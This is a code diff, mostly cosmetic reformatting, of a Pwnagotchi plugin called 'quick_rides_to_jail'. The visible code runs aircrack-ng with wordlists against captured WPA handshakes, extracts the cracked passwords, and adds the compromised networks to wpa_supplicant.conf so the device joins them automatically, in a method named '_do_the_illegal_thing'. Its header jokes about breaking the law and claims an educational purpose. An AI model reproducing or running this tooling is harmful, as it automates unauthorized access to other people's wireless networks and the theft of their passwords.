@@ -1,4 +1,4 @@
-'''
+"""
 Aircrack-ng needed, to install:
 > apt-get install aircrack-ng
 Upload wordlist files in .txt format to folder in config file (Default: /opt/wordlists/)
@@ -21,7 +21,8 @@ Original use-case:
 For educational and testing purposes, only. If you do not think that you have violated the law,
 you most certainly are about to. By using and enabling the full functionality of this script,
 you here by agree to sit quietly in the back of the police car.
-'''
+"""
+
 import logging
 import json
 import os
@@ -35,16 +36,13 @@ import pwnagotchi.plugins as plugins
 READY = False
 OPTIONS = dict()
 REPORT = StatusFile("/root/.aircracked_pcaps", data_format="json")
-TEXT_TO_SET = ''
+TEXT_TO_SET = ""
 
-PwndNetwork = namedtuple('PwndNetwork', 'ssid bssid password')
-handshake_file_re = re.compile(
-    '^(?P<ssid>.+?)_(?P<bssid>[a-f0-9]{12})\.pcap\.cracked$')
+PwndNetwork = namedtuple("PwndNetwork", "ssid bssid password")
+handshake_file_re = re.compile("^(?P<ssid>.+?)_(?P<bssid>[a-f0-9]{12})\.pcap\.cracked$")
 crackable_handshake_re = re.compile(
-    '\s+\d+\s+(?P<bssid>([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2})\s+(?P<ssid>.+?)\s+((\([1-9][0-9]* handshake(, with PMKID)?\))|(\(\d+ handshake, with PMKID\)))')
-
-
-
+    "\s+\d+\s+(?P<bssid>([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2})\s+(?P<ssid>.+?)\s+((\([1-9][0-9]* handshake(, with PMKID)?\))|(\(\d+ handshake, with PMKID\)))"
+)
 
 
 class quick_rides_to_jail(plugins.Plugin):
@@ -107,10 +105,7 @@ class quick_rides_to_jail(plugins.Plugin):
                 except:
                     continue
         except Exception as e:
-            logging.error(
-                f"[{self.__class__.__name__}] Encountered exception in on_ready: %s" % (
-                    e)
-            )
+            logging.error("[thePolice] Encountered exception in on_ready: %s" % (e))
 
     def on_handshake(self, agent, filename, access_point, client_station):
         global REPORT
@@ -121,10 +116,7 @@ class quick_rides_to_jail(plugins.Plugin):
                 reported.append(filename)
                 REPORT.update(data={"reported": reported})
         except Exception as e:
-                except Exception as e:
-        logging.error(
-            f"[{self.__class__.__name__}] Encountered exception in on_handshake: %s" % (e))
-
+            logging.error("[thePolice] Encountered exception in on_handshake: %s" % (e))
 
     def set_text(self, text):
         global TEXT_TO_SET
@@ -155,10 +147,10 @@ class quick_rides_to_jail(plugins.Plugin):
                 )
                 return
         except Exception as e:
-            logging.warn(
-                f"[{self.__class__.__name__}] Exception while checking for quickdic plugin in config file: %s",
-                e,
+            logging.warning(
+                "[thePolice] Exception while running initial aircrack-ng check: %s", e
             )
+            return
 
         try:
             aircrack_execution = subprocess.run(
@@ -168,9 +160,9 @@ class quick_rides_to_jail(plugins.Plugin):
             )
             result = aircrack_execution.stdout.decode("utf-8").strip()
         except Exception as e:
-            logging.warn(
-                f"[{self.__class__.__name__}] Exception while running initial aircrack-ng check: %s",
-                e,
+            logging.error(
+                "[thePolice] Exception while running aircrack-ng for %s: %s"
+                % (crackable_handshake.group("bssid"), e)
             )
             return
 
@@ -215,7 +207,6 @@ class quick_rides_to_jail(plugins.Plugin):
             set_text("Cracked password: " + str(key.group(1)))
             display.update(force=True)
 
-
     def _reconfigure_wpa_supplicant(self):
         try:
             command = "wpa_cli -i {} reconfigure".format(OPTIONS["interface"])
@@ -223,23 +214,21 @@ class quick_rides_to_jail(plugins.Plugin):
 
             if result.strip() == "OK":
                 logging.info(
-                    f"[{self.__class__.__name__}] Successfully updated wpa_supplicant for {}.".format(
+                    "[quick_rides_to_jail] Successfully updated wpa_supplicant for {}.".format(
                         OPTIONS["interface"]
                     )
                 )
                 return
             logging.info(
-                f"[{self.__class__.__name__}] Failed to update wpa_supplicant for {}.".format(
+                "[quick_rides_to_jail] Failed to update wpa_supplicant for {}.".format(
                     OPTIONS["interface"]
                 )
             )
 
         except Exception as e:
             logging.error(
-                f"[{self.__class__.__name__}] Exception while reconfiguring wpa_supplicant: %s",
-                e,
+                "[thePolice] Exception while reconfiguring wpa_supplicant: %s", e
             )
-
 
     def _get_pwnd_networks(self, handshakes_path):
         pwnd_networks = []
@@ -256,20 +245,17 @@ class quick_rides_to_jail(plugins.Plugin):
                     pwnd_networks.append(
                         PwndNetwork(
                             file_match.group("ssid"),
-                            re.sub(r"(.{2})(?!$)", r"\1:",
-                                file_match.group("bssid")),
+                            re.sub(r"(.{2})(?!$)", r"\1:", file_match.group("bssid")),
                             f.read(),
                         )
                     )
             except Exception as e:
                 logging.error(
-                    f"[{self.__class__.__name__}] Exception while processing handshake file: %s",
-                    e,
+                    "[thePolice] Exception while processing handshake file: %s", e
                 )
                 continue
 
         return pwnd_networks
-
 
     def _add_pwnd_networks_to_wpa_supplicant(self, handshakes_path):
         wpa_supplicant_text = ""
@@ -279,7 +265,7 @@ class quick_rides_to_jail(plugins.Plugin):
                 wpa_supplicant_text = f.read()
         except Exception as e:
             logging.error(
-                f"[{self.__class__.__name__}] Exception while opening and reading wpa_supplicant config file: %s",
+                "[thePolice] Exception while opening and reading wpa_supplicant config file: %s",
                 e,
             )
             return
@@ -299,26 +285,24 @@ class quick_rides_to_jail(plugins.Plugin):
                     updated_count += 1
             except Exception as e:
                 logging.error(
-                    f"[{self.__class__.__name__}] Exception while opening and writing to wpa_supplicant config file: %s",
+                    "[thePolice] Exception while opening and writing to wpa_supplicant config file: %s",
                     e,
                 )
                 continue
 
         if updated_count > 0:
             logging.info(
-                f"[{self.__class__.__name__}] Congratulations! You added {} new access points to your wpa_supplicant.conf.".format(
+                "[quick_rides_to_jail] Congratulations! You added {} new access points to your wpa_supplicant.conf.".format(
                     updated_count
                 )
             )
             logging.info(f"[{self.__class__.__name__}] You're goin to jail!")
             _reconfigure_wpa_supplicant()
 
-
     def _get_network_interfaces(
         self,
     ):
         return os.listdir(OPTIONS["net_device_path"])
-
 
     def _device_in_monitor_mode(self, device_name):
         device_type = ""
@@ -338,7 +322,6 @@ class quick_rides_to_jail(plugins.Plugin):
             return True
         return False
 
-
     def _do_the_illegal_thing(self, handshakes_path):
         if OPTIONS["interface"] not in _get_network_interfaces():
             logging.info(
@@ -355,6 +338,7 @@ class quick_rides_to_jail(plugins.Plugin):
             )
             return
         logging.info(
-            f"[{self.__class__.__name__}] Desired interface is not in monitor mode.")
+            f"[{self.__class__.__name__}] Desired interface is not in monitor mode."
+        )
 
         _add_pwnd_networks_to_wpa_supplicant(handshakes_path)
